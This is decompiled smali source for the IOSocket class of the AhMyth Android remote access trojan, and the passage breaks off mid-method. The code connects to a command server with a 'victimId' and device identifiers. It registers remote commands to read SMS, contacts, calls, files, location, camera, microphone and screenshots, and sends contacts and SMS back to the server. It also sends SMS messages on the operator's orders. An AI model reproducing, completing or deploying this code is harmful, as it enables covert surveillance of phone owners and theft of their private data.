.class public Lahmyth/mine/king/ahmyth/IOSocket;
.super Ljava/lang/Object;
.source "IOSocket.java"


# static fields
.field private static final INSTANCE:Lahmyth/mine/king/ahmyth/IOSocket;

.field private static final TAG:Ljava/lang/String; = "IOSocket"


# instance fields
.field private ioSocket:Lio/socket/client/Socket;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 26
    new-instance v0, Lahmyth/mine/king/ahmyth/IOSocket;

    invoke-direct {v0}, Lahmyth/mine/king/ahmyth/IOSocket;-><init>()V

    sput-object v0, Lahmyth/mine/king/ahmyth/IOSocket;->INSTANCE:Lahmyth/mine/king/ahmyth/IOSocket;

    return-void
.end method

.method private constructor <init>()V
    .locals 0

    .line 29
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static connect(Ljava/lang/String;I)V
    .locals 10

    const-string v0, "get-screenshot"

    const-string v1, "mic-record"

    const-string v2, ":"

    .line 50
    sget-object v3, Lahmyth/mine/king/ahmyth/IOSocket;->INSTANCE:Lahmyth/mine/king/ahmyth/IOSocket;

    iget-object v4, v3, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string v5, "IOSocket"

    if-eqz v4, :cond_0

    invoke-virtual {v4}, Lio/socket/client/Socket;->connected()Z

    move-result v4

    if-eqz v4, :cond_0

    const-string p0, "Socket ya conectado"

    .line 51
    invoke-static {v5, p0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    return-void

    .line 55
    :cond_0
    :try_start_0
    invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->getContextOfApplication()Landroid/content/Context;

    move-result-object v4

    .line 57
    invoke-virtual {v4}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v4

    const-string v6, "android_id"

    .line 56
    invoke-static {v4, v6}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 61
    new-instance v6, Lio/socket/client/IO$Options;

    invoke-direct {v6}, Lio/socket/client/IO$Options;-><init>()V

    const-wide/16 v7, -0x1

    .line 62
    iput-wide v7, v6, Lio/socket/client/IO$Options;->timeout:J

    const/4 v7, 0x1

    .line 63
    iput-boolean v7, v6, Lio/socket/client/IO$Options;->reconnection:Z

    const-wide/16 v7, 0x1388

    .line 64
    iput-wide v7, v6, Lio/socket/client/IO$Options;->reconnectionDelay:J

    const-wide/32 v7, 0x7fffffff

    .line 65
    iput-wide v7, v6, Lio/socket/client/IO$Options;->reconnectionDelayMax:J

    .line 68
    invoke-static {}, Lahmyth/mine/king/ahmyth/IOSocket;->getLocalIpAddress()Ljava/lang/String;

    move-result-object v7

    .line 69
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v8, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    .line 71
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "http://"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string p0, "?victimId="

    invoke-virtual {v8, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 72
    invoke-static {v7}, Landroid/net/Uri;->encode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v8, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p0, "&model="

    invoke-virtual {v8, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object p0, Landroid/os/Build;->MODEL:Ljava/lang/String;

    .line 73
    invoke-static {p0}, Landroid/net/Uri;->encode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v8, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p0, "&manf="

    invoke-virtual {v8, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object p0, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    invoke-virtual {v8, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p0, "&release="

    invoke-virtual {v8, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object p0, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    invoke-virtual {v8, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p0, "&id="

    invoke-virtual {v8, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    .line 78
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Conectando a socket en: "

    invoke-virtual {p1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v5, p1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 79
    invoke-static {p0, v6}, Lio/socket/client/IO;->socket(Ljava/lang/String;Lio/socket/client/IO$Options;)Lio/socket/client/Socket;

    move-result-object p0

    iput-object p0, v3, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "connect"

    .line 82
    sget-object v2, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$_0h8gPZBuS9unWZuZtDprS610QA;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$_0h8gPZBuS9unWZuZtDprS610QA;

    invoke-virtual {p0, p1, v2}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 86
    iget-object p0, v3, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "disconnect"

    sget-object v2, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$-vXBln6ibyVJbb21LMxhh4TqM2g;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$-vXBln6ibyVJbb21LMxhh4TqM2g;

    invoke-virtual {p0, p1, v2}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 90
    iget-object p0, v3, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "connect_error"

    sget-object v2, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$WhIT8z6m_Zmy5HThUwWIG3ulU00;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$WhIT8z6m_Zmy5HThUwWIG3ulU00;

    invoke-virtual {p0, p1, v2}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 94
    iget-object p0, v3, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "connect_timeout"

    sget-object v2, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$3jAuHfiEtmCPVcsM2-_1A0_wQ_4;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$3jAuHfiEtmCPVcsM2-_1A0_wQ_4;

    invoke-virtual {p0, p1, v2}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 98
    iget-object p0, v3, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "error"

    sget-object v2, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$fQXScw3eafWBadnl_Vuzw5c4R-U;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$fQXScw3eafWBadnl_Vuzw5c4R-U;

    invoke-virtual {p0, p1, v2}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 102
    iget-object p0, v3, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "reconnect"

    sget-object v2, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$XQGJd5FdfS4Pj93aHsASgYpbbXw;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$XQGJd5FdfS4Pj93aHsASgYpbbXw;

    invoke-virtual {p0, p1, v2}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 106
    iget-object p0, v3, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "reconnect_attempt"

    sget-object v2, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$qj8R0ufOGyOAIu4M5J46eDXZqzY;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$qj8R0ufOGyOAIu4M5J46eDXZqzY;

    invoke-virtual {p0, p1, v2}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 110
    iget-object p0, v3, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "reconnect_failed"

    sget-object v2, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$JqlQq-V43W8K-PZGMmTWaZAMXmY;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$JqlQq-V43W8K-PZGMmTWaZAMXmY;

    invoke-virtual {p0, p1, v2}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 119
    iget-object p0, v3, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    invoke-virtual {p0, v1}, Lio/socket/client/Socket;->off(Ljava/lang/String;)Lio/socket/emitter/Emitter;

    .line 120
    iget-object p0, v3, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    sget-object p1, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$Xb-3tAJFJgH0UNgwv_vsk13MEic;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$Xb-3tAJFJgH0UNgwv_vsk13MEic;

    invoke-virtual {p0, v1, p1}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 154
    iget-object p0, v3, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "get-calls"

    sget-object v1, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$gLprR1-aC7p6nXf0IA_OEfYeTzI;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$gLprR1-aC7p6nXf0IA_OEfYeTzI;

    invoke-virtual {p0, p1, v1}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 161
    iget-object p0, v3, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "get-contacts"

    sget-object v1, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$CmV4jfM7qdrOhkoJf26Fo5rUL9g;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$CmV4jfM7qdrOhkoJf26Fo5rUL9g;

    invoke-virtual {p0, p1, v1}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 170
    iget-object p0, v3, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "get-sms"

    sget-object v1, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$K99KrmiVx89tfY9zs5BM5JBDXsU;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$K99KrmiVx89tfY9zs5BM5JBDXsU;

    invoke-virtual {p0, p1, v1}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 177
    iget-object p0, v3, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "send-sms"

    sget-object v1, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$epovP0xiDX1mp6OForV2l5VS5zA;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$epovP0xiDX1mp6OForV2l5VS5zA;

    invoke-virtual {p0, p1, v1}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 212
    iget-object p0, v3, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "get-photo"

    sget-object v1, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$TN9wOmRScOS4bVQZxQVl0ycvaZ4;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$TN9wOmRScOS4bVQZxQVl0ycvaZ4;

    invoke-virtual {p0, p1, v1}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 234
    iget-object p0, v3, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "get-camera-list"

    sget-object v1, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$Thgy2SHQSV3LkgONUnPRNShZFK4;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$Thgy2SHQSV3LkgONUnPRNShZFK4;

    invoke-virtual {p0, p1, v1}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 240
    iget-object p0, v3, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "get-files"

    sget-object v1, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$nm20Q56X-KCjWJ6AIWGfE7PQCcU;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$nm20Q56X-KCjWJ6AIWGfE7PQCcU;

    invoke-virtual {p0, p1, v1}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 252
    iget-object p0, v3, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "download-file"

    sget-object v1, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$-tSpRx_RzQSu_IaRHm4H1I4n0Lo;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$-tSpRx_RzQSu_IaRHm4H1I4n0Lo;

    invoke-virtual {p0, p1, v1}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 264
    iget-object p0, v3, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string p1, "get-location"

    sget-object v1, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$1EYGEgp-q_U18q1dAYcnScu_qW8;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$1EYGEgp-q_U18q1dAYcnScu_qW8;

    invoke-virtual {p0, p1, v1}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 295
    iget-object p0, v3, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    invoke-virtual {p0, v0}, Lio/socket/client/Socket;->off(Ljava/lang/String;)Lio/socket/emitter/Emitter;

    .line 296
    iget-object p0, v3, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    sget-object p1, Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$HKJLR0K_sPViFDGMSmJVtZLapfw;->INSTANCE:Lahmyth/mine/king/ahmyth/-$$Lambda$IOSocket$HKJLR0K_sPViFDGMSmJVtZLapfw;

    invoke-virtual {p0, v0, p1}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 329
    iget-object p0, v3, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    invoke-virtual {p0}, Lio/socket/client/Socket;->connect()Lio/socket/client/Socket;
    :try_end_0
    .catch Ljava/net/URISyntaxException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p0

    const-string p1, "Error al conectar socket"

    .line 334
    invoke-static {v5, p1, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    goto :goto_0

    :catch_1
    move-exception p0

    const-string p1, "URL de socket inv\u00e1lida"

    .line 332
    invoke-static {v5, p1, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_0
    return-void
.end method

.method public static disconnect()V
    .locals 2

    .line 339
    sget-object v0, Lahmyth/mine/king/ahmyth/IOSocket;->INSTANCE:Lahmyth/mine/king/ahmyth/IOSocket;

    iget-object v1, v0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    if-eqz v1, :cond_0

    .line 340
    invoke-virtual {v1}, Lio/socket/client/Socket;->disconnect()Lio/socket/client/Socket;

    const/4 v1, 0x0

    .line 341
    iput-object v1, v0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const-string v0, "IOSocket"

    const-string v1, "Socket desconectado"

    .line 342
    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    :cond_0
    return-void
.end method

.method public static getInstance()Lahmyth/mine/king/ahmyth/IOSocket;
    .locals 1

    .line 347
    sget-object v0, Lahmyth/mine/king/ahmyth/IOSocket;->INSTANCE:Lahmyth/mine/king/ahmyth/IOSocket;

    return-object v0
.end method

.method public static getLocalIpAddress()Ljava/lang/String;
    .locals 4

    .line 34
    :try_start_0
    invoke-static {}, Ljava/net/NetworkInterface;->getNetworkInterfaces()Ljava/util/Enumeration;

    move-result-object v0

    :cond_0
    invoke-interface {v0}, Ljava/util/Enumeration;->hasMoreElements()Z

    move-result v1

    if-eqz v1, :cond_2

    .line 35
    invoke-interface {v0}, Ljava/util/Enumeration;->nextElement()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/net/NetworkInterface;

    .line 36
    invoke-virtual {v1}, Ljava/net/NetworkInterface;->getInetAddresses()Ljava/util/Enumeration;

    move-result-object v1

    :cond_1
    invoke-interface {v1}, Ljava/util/Enumeration;->hasMoreElements()Z

    move-result v2

    if-eqz v2, :cond_0

    .line 37
    invoke-interface {v1}, Ljava/util/Enumeration;->nextElement()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/net/InetAddress;

    .line 38
    invoke-virtual {v2}, Ljava/net/InetAddress;->isLoopbackAddress()Z

    move-result v3

    if-nez v3, :cond_1

    instance-of v3, v2, Ljava/net/Inet4Address;

    if-eqz v3, :cond_1

    .line 39
    invoke-virtual {v2}, Ljava/net/InetAddress;->getHostAddress()Ljava/lang/String;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object v0

    :catch_0
    move-exception v0

    const-string v1, "IOSocket"

    const-string v2, "Error obteniendo IP local"

    .line 44
    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_2
    const-string v0, "0.0.0.0"

    return-object v0
.end method

.method static synthetic lambda$connect$0([Ljava/lang/Object;)V
    .locals 1

    const-string p0, "IOSocket"

    const-string v0, "Socket conectado al servidor"

    .line 83
    invoke-static {p0, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method static synthetic lambda$connect$1([Ljava/lang/Object;)V
    .locals 1

    const-string p0, "IOSocket"

    const-string v0, "Socket desconectado del servidor"

    .line 87
    invoke-static {p0, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method static synthetic lambda$connect$10([Ljava/lang/Object;)V
    .locals 3

    .line 162
    invoke-static {}, Lahmyth/mine/king/ahmyth/ContactsManager;->getContacts()Lorg/json/JSONObject;

    move-result-object p0

    .line 163
    sget-object v0, Lahmyth/mine/king/ahmyth/IOSocket;->INSTANCE:Lahmyth/mine/king/ahmyth/IOSocket;

    iget-object v0, v0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    if-eqz p0, :cond_0

    invoke-virtual {p0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p0

    goto :goto_0

    :cond_0
    const-string p0, "[]"

    :goto_0
    const/4 v2, 0x0

    aput-object p0, v1, v2

    const-string p0, "contacts-data"

    invoke-virtual {v0, p0, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    return-void
.end method

.method static synthetic lambda$connect$11([Ljava/lang/Object;)V
    .locals 3

    const-string p0, "IOSocket"

    const-string v0, "Recibido evento get-sms"

    .line 171
    invoke-static {p0, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 172
    invoke-static {}, Lahmyth/mine/king/ahmyth/SMSManager;->getSMSList()Lorg/json/JSONObject;

    move-result-object p0

    .line 173
    sget-object v0, Lahmyth/mine/king/ahmyth/IOSocket;->INSTANCE:Lahmyth/mine/king/ahmyth/IOSocket;

    iget-object v0, v0, Lahmyth/mine/king/ahmyth/IOSocket;->ioSocket:Lio/socket/client/Socket;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    if-eqz p0, :cond_0

    invoke-virtual {p0}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object p0

    goto :goto_0

    :cond_0
    const-string p0, "[]"

    :goto_0
    const/4 v2, 0x0

    aput-object p0, v1, v2

    const-string p0, "sms-data"

    invoke-virtual {v0, p0, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    return-void
.end method

.method static synthetic lambda$connect$12([Ljava/lang/Object;)V
    .locals 7

    const-string v0, "IOSocket"

    const-string v1, ""

    const/4 v2, 0x0

    .line 181
    :try_start_0
    array-length v3, p0

    if-lez v3, :cond_1

    .line 182
    aget-object p0, p0, v2

    .line 183
    instance-of v3, p0, Lorg/json/JSONObject;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    const-string v4, "msg"

    const-string v5, "phoneNo"

    if-eqz v3, :cond_0

    .line 184
    :try_start_1
    move-object v3, p0

    check-cast v3, Lorg/json/JSONObject;

    invoke-virtual {v3, v5, v1}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_2

    .line 185
    :try_start_2
    check-cast p0, Lorg/json/JSONObject;

    invoke-virtual {p0, v4, v1}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_1

    :catch_0
    move-exception p0

    goto :goto_0

    .line 186
    :cond_0
    :try_start_3
    instance-of v3, p0, Ljava/lang/String;

    if-eqz v3, :cond_1

    .line 187
    new-instance v3, Lorg/json/JSONObject;

    check-cast p0, Ljava/lang/String;

    invoke-direct {v3, p0}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    .line 188
    invoke-virtual {v3, v5, v1}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    .line 189
    :try_start_4
    invoke-virtual {v3, v4, v1}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    move-object v6, v1

    move-object v1, p0

    move-object p0, v6

    goto :goto_2

    :catch_1
    move-exception v3

    move-object v6, v3

    move-object v3, p0

    move-object p0, v6

    goto :goto_0

    :cond_1
    move-object p0, v1

    goto :goto_2

    :catch_2
    move-exception p0

    move-object v3, v1

    :goto_0
    const-string v4, "Error leyendo datos de send-sms"

    .line 193
    invoke-static {v0, v4, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    move-object p0, v1

    :goto_1
    move-object v1, v3

    .line 195
    :goto_2
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Enviando SMS a: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, ", mensaje: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v0, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 197
    :try_start_5
    invoke-static {v1, p0}, Lahmyth/mine/king/ahmyth/SMSManager;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    goto :goto_4

    :catch_3
    move-exception p0

    .line 199
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Error en sendSMS: "

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 200
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    :try_start_6
    const-string v3, "ok"

    .line 202
    invoke-virtual {v1, v3, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string v3, "error"

    .line 203
    invoke-virtual {p0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v1, v3, p0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_6
    .catch Lorg/json/JSONException; {:try_start_6 .. :try_end_6} :catch_4

    goto :goto_3

    :catch_4
    move-exception p0

    const-string v3, "Error creando JSON de error"

    .line 205
